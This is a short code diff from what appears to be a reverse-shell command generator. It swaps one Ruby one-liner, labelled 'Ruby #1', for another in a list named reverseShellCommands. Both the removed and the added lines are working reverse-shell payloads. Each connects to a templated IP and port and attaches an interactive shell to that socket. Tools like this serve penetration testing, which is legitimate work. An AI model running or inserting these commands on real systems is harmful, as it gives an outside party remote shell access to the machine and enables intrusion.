@@ -215,7 +215,7 @@ const reverseShellCommands = withCommandType(
         },
         {
             "name": "Ruby #1",
-            "command": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"{shell} -i <&%d >&%d 2>&%d\",f,f,f)'",
+            "command": "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'",
             "meta": ["linux", "mac"]
         },
         {
